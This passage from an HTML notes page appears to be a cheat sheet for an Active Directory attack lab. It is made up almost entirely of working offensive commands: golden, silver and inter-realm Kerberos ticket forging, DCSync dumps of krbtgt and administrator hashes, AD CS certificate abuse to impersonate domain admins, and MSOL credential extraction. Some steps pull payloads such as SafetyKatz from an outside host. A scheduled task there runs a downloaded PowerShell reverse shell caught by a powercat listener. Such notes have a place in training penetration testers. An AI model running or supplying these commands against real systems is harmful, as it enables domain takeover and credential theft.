</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>If any new users are found, <em>PTH and Find-PSRemotingLocalAdminAccess -Verbose</em></p>
      </blockquote>

    </div>
  </details>

  <details>
    <summary>Tickets</summary>
    <div class="content">
      <p> </p>

      <p><strong>GOLDEN</strong></p>

      <p><strong>Without using Invoke-Mimi.ps1</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">klist</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\dc\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">x</span><span class="w">
</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Using Invoke-Mimi.ps1 and PowerShell Remoting</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w">
</span><span class="nx">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span><span class="w">
</span><span class="nv">$sess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">machine</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">

</span><span class="c"># bypass AMSI </span><span class="w">

</span><span class="kr">exit</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>SILVER</strong></p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /target:&lt;target&gt; /service:HOST /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">klist</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Start a listening in another prompt</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\powercat.ps1</span><span class="w">
</span><span class="n">powercat</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">443</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">1000</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/create</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">machine</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/SC</span><span class="w"> </span><span class="nx">Weekly</span><span class="w"> </span><span class="nx">/RU</span><span class="w"> </span><span class="s2">"NT Authority\SYSTEM"</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"Userx"</span><span class="w"> </span><span class="nx">/TR</span><span class="w"> </span><span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.x/Invoke-PowerShellTcpEx.ps1''')'"</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/Run</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">machine</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"Userx"</span><span class="w">
</span></code></pre></div>      </div>

      <p>We should get a shell on the listener prompt.</p>

      <blockquote>
        <p>For <em>WMI</em>, we need 2 tickets – <em>HOST and RPCSS</em></p>
      </blockquote>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /target:&lt;target dc&gt; /service:HOST /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /target:&lt;target dc&gt; /service:RPCSS /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>DCSync</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\PowerView.ps1</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check if the user has Replication Rights</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="s2">"dc=us,dc=domain,dc=local"</span><span class="w"> </span><span class="nt">-SearchScope</span><span class="w"> </span><span class="nx">Base</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectAceType</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'replication-get'</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ActiveDirectoryRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'GenericAll'</span><span class="p">)}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'IdentityName'</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="p">);</span><span class="bp">$_</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"studentuserx"</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>With DA privileges We can add those rights</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::opassth /user:administrator /domain:domain.local /aes256:&lt;hash&gt; /run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Using Powerview</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"dc=us,dc=domain,dc=local"</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">studentuserx</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-PrincipalDomain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">-TargetDomain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Using AD Module with Set-ADACL from RACE</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ADACL</span><span class="w"> </span><span class="nt">-DistinguishedName</span><span class="w"> </span><span class="s1">'DC=us,DC=domain,DC=local'</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">studentuserx</span><span class="w"> </span><span class="nt">-GUIDRight</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>From a normal shell, check the rights again</p>
      </blockquote>

      <p><strong>Now we can execute DCSync attacks</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:domain\krbtgt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:domain\krbtgt"'</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>AD CS</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">cas</span><span class="w">
</span><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>ENROLLEE_SUPPLIES_SUBJECT attribute means we can request a certificate for ANY user</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">/enrolleeSuppliesSubject</span><span class="w">
</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\user.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:domain-DC.domain.local\DOMAIN-DC-CA</span><span class="w"> </span><span class="nx">/template:ForAdminsofPrivilegedAccessWorkstations</span><span class="w"> </span><span class="nx">/altname:Administrator</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p><em>Copy all the text between —–BEGIN RSA PRIVATE KEY—– and —–END CERTIFICATE—– and save it to cert.pem</em></p>
      </blockquote>

      <p>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP “Microsoft Enhanced Cryptographic Provider v1.0” -export -out C:\AD\Tools\DA.pfx</p>

      <p><strong>Finally, request a TGT for the DA</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\DA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>For EA</strong></p>

      <p><strong>Request and convert to PFX, then request the TGT</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:domain.local\Administrator</span><span class="w"> </span><span class="nx">/dc:domain-dc.domain.local</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\EA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">domain-dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Azure AD Connect</summary>
    <div class="content">

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"samAccountName -like 'MSOL_*'"</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">SamAccountName</span><span class="p">,</span><span class="nx">Description</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span><span class="nx">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\us-adconnect\C</span><span class="err">$</span><span class="nx">\Users\</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="nx">\Downloads\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\us-adconnect\C</span><span class="err">$</span><span class="nx">\Users\</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="nx">\Downloads\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-adconnect</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="nx">\Downloads</span><span class="w">
</span><span class="n">RunWithRegistryNonAdmin.bat</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Extract credentials of MSOL_</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://192.168.100.x/adconnect.ps1'</span><span class="p">)</span><span class="w">
</span><span class="nx">ADconnect</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Now we can run DCsync (From elevated shell)</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">runas</span><span class="w"> </span><span class="nx">/user:domain.local\MSOL_16fb75d0227d</span><span class="w"> </span><span class="nx">/netonly</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:domain\administrator /domain:domain.local"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>DCsync (from a normal shell)</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">runas</span><span class="w"> </span><span class="nx">/user:domain.local\MSOL_16fb75d0227d</span><span class="w"> </span><span class="nx">/netonly</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w">
</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:domain\administrator /domain:domain.local"'</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Domain Privesc (TrustKey &amp; KRBTGT)</summary>
    <div class="content">
      <p> </p>

      <p><strong>Using TRUSTKEY</strong></p>

      <p><strong>With DA - Escalate to EA or DA of the parent domain</strong>:</p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\dc\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">x</span><span class="w">
</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span><span class="n">lsadump::trust</span><span class="w"> </span><span class="nx">/patch</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>Grab the RC4 of [ In ] child domain -&gt; parent domain**</p>
      </blockquote>

      <p><strong>Create the inter-realm TGT using the trust key</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:&lt;hash&gt; /user:Administrator /service:krbtgt /target:domain.local /ticket:C:\AD\Tools\trust_tkt.kirbi"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\AD\Tools\trust_tkt.kirbi</span><span class="w"> </span><span class="nx">/service:CIFS/domain-dc.domain.local</span><span class="w"> </span><span class="nx">/dc:domain-dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">klist</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dir</span><span class="w"> </span><span class="nx">\\domain-dc.domain.local\c</span><span class="err">$</span><span class="w">
</span></code></pre></div>      </div>
      <p> </p>

      <p><strong>Using KRBTGT Hash</strong></p>

      <p><strong>Create inter-realm TGT with SID history for Enterprise Admins</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:&lt;hash&gt; /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">klist</span><span class="w">
</span><span class="nx">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">domain-dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Abuse Trust Relationship (Forest)</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /aes256:&lt;hash&gt; /ptt"</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/user:domain\user</span><span class="err">$</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy SafetyKatz and Rubeus</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\BetterSafetyKatz.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Forge an inter-realm TGT</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /rc4:&lt;hash&gt; /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\Users\Public\sharedwithdomain.kirbi"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\Users\Public\sharedwithdomain.kirbi</span><span class="w"> </span><span class="nx">/service:CIFS/dc.domain.local</span><span class="w"> </span><span class="nx">/dc:dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>With the CIFS service we can access the share</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dir</span><span class="w"> </span><span class="nx">\\dc.domain.local\eushare</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>Access the target forest using PowerShell Remoting</p>
      </blockquote>

      <p><strong>Check if SIDHistroy is enabled for the trust between the 2 Forests</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check if there are any groups with SID&gt;1000</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span></code></pre></div>      </div>

